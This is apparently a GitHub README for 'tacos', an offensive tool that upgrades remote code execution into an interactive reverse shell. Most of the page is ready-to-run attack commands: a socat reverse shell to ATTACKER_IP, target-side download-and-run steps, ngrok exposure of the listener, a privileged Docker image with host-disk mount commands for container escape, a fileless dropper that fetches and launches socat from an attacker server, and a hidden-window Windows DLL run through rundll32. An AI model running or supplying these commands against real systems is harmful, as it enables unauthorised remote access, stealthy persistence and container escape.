# tacos 🌮 
<sup>(reverse `socat`)</sup>

<div align=center>
<img src=https://github.com/ariary/tacos/blob/main/logo.png width=250>

Spawn a pty in your reverse shell to <strong>automaticaly</strong> make it <strong>interactive</strong> for socat listener.

<strong> Fast interactive reverse shell set-up [ 🐳 (container) ](#with-docker-recommended)</strong>

<sup><code><b> All credit goes to <a href=https://github.com/laluka/pty4all>laluka</a> idea </b></code></sup>
</div>



Equivalent of:
```shell
socat exec:'bash -il',pty,stderr,setsid,sigint,sane OPENSSL:[ATTACKER_IP:PORT],verify=0
```

**Why ?**
* transform RCE to interactive reverse shell with almost no prerequisite (only `curl`)
* cross-platform *(windows support is OK but not yet interactive. It is recommended to use non-docker solution for it)*
* tired of hitting ^C and loosing your shell?
* too lazy to copy/paste/learn socat command
* target doesn't have `socat` and you don't want to do [this](#alternative)
* provide more advanced configuration to the tty (alias, etc)
* easier to obfuscate


## Usage

« I quicly want an interactive reverse shell», take a wrap! 🥙
```shell
# On attacker machine
tmux
wrap --lhost [ATTACKER_IP] #launch socat listener + output command to run on target

# On target
# paste command outputted by wrap: it will download tacos, and launch it to obtain the interactive revshell
```

<details>
<summary><h4>🎁 Bonus n°1: expose listener to the world wide web</h4></summary>
Useful if target can't directly reach the attacker machine, but has internet access
<br> On attacker machine, install <code>ngrok</code> or <code>bore</code> and launch your listener:
<pre><code>wrap -n
</code></pre>

<i><b>N.B:</b></i> ngrok is more stable than bore for now
</details>

### With docker (recommended)

Source aliases *(for simplicity)*:
```shell
alias tacos.container='docker run --net host --rm -it ariary/tacos'
```

Launch multi-handler listener:
```shell
tacos.container [LISTENING_ADDR] [LISTENING_PORT] # [OPTIONAL_TACOS_ARS]
```

***Notes about `tacos` container security:***
> From a networking point of view, this is the same level of isolation as if the processes were running directly on the host and not in a container. However, in all other ways, such as storage, process namespace, and user namespace, the process is isolated from the host.

<details>
<summary><h4>🎁 Bonus n°2: <code>tacos</code> reverse shell image</h4></summary>
Useful if target is running docker, kubernetes, etc ...
<br> On attacker machine, launch your <code>tacos</code> listener as usual
<br> On target:
<pre><code>
docker run --privileged --rm -it ariary/tacos-reverse [TACOS_LISTENER_IP]:[TACOS_LISTENER_PORT]
</code></pre>
<blockquote>💡: <code>--privileged</code> mode is not mandatory. It is used to allow container escaping with:
<pre><code>
fdisk -l
mkdir /mnt/hostfs
mount /dev/sda1 /mnt/hostfs
</code></pre>
</blockquote>
<br>
<blockquote>💡: If you only have writing access to a manifest deploying containers. Use <code>ariary/tacos-reverse</code> image with appropriate arguments
</blockquote>
</details>


## Install
### tacos
#### Docker
```shell
docker pull ariary/tacos
```

#### Release
```shell
curl -lO -L -s https://github.com/ariary/tacos/releases/latest/download/tacos && chmod +x tacos
```

#### From git
need `go`:
```shell
git clone https://github.com/ariary/tacos.git && cd tacos
make before.build
make build.tacos          # or make build.tacos.windows
```

### wrap
need `nim`:

```shell
git clone https://github.com/ariary/tacos.git && cd tacos
make build.wrap 
```

## Alternatives

Alternatively, if target does not have `socat`:
**Host** a [static](https://github.com/minos-org/minos-static/blob/master/static-get) version of `socat` binary and **download + execute it** using the stealthy  [`filess-xec`](https://github.com/ariary/fileless-xec) dropper:
```shell
# On attacker machine
# get socat static & expose it
static-get socat
python3 -m http.server 8080

# On target machine
# Use already downloaded fileless-xec to download socat and stealthy launch it with argument
fileless-xec [ATTACKER_IP]:8080/socat -- exec:'bash -il',pty,stderr,setsid,sigint,sane OPENSSL:[ATTACKER_IP]:[SOCAT_LISTENING_PORT],verify=0
```

### Use dll instead of `.exe`
```shell
# On attacker machine:
# modify ./cmd/tacosdll/tacosdll.go with the according IP:PORT
$ GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -buildmode=c-shared -ldflags="-w -s -H=windowsgui" -o tacos.dll ./cmd/tacosdll/tacosdll.go

# On remote:
> rundll32.exe ./tacos.dll,Tacos
```
